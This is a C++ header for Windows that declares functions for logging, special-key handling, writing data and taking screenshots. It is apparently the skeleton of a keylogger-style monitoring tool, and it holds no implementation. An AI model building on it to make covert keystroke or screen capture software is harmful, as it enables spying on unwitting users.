#pragma once

#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <direct.h>
#include <io.h>

#include "KeyMasterUtils.h"

#pragma warning(disable : 4996)
#pragma warning(disable : 6031)
#pragma omp parallel for

void writeData(std::string);
bool SpecialKeys(int);
void logger();
void takeScreenshots(Utils);
void start_x(Utils);